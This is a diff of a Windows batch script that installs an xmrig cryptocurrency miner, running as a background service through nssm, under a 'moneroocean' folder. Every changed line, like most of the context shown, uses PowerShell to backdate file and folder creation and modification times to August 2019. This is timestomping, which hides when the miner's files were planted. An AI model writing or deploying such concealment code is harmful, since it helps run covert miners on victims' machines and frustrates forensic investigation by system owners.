@@ -329,8 +329,6 @@ powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\xmrig.exe').CreationTi
 powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\xmrig.exe').LastWriteTime=('4 August 2019 19:00:00')"
 
 
-powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\nssm.exe').CreationTime=('3 August 2019 17:00:00')"
-powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\nssm.exe').LastWriteTime=('4 August 2019 19:00:00')"
 
 powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\WinRing0x64.sys').CreationTime=('5 August 2019 12:00:00')"
 powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\WinRing0x64.sys').LastWriteTime=('8 August 2019 19:00:00')"
@@ -416,11 +414,15 @@ if errorlevel 1 (
 "%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
 
 
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\nssm.exe').CreationTime=('3 August 2019 17:00:00')"
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\nssm.exe').LastWriteTime=('4 August 2019 19:00:00')"
+
+
 powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\miner.bat').CreationTime=('3 August 2019 17:00:00')"
 powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\miner.bat').LastWriteTime=('3 August 2019 17:00:00')"
 
-powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\').CreationTime=('3 August 2019 17:00:00')"
-powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\').LastWriteTime=('3 August 2019 17:00:00')"
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\').CreationTime=('2 August 2019 17:00:00')"
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\').LastWriteTime=('2 August 2019 17:00:00')"
 
 
 
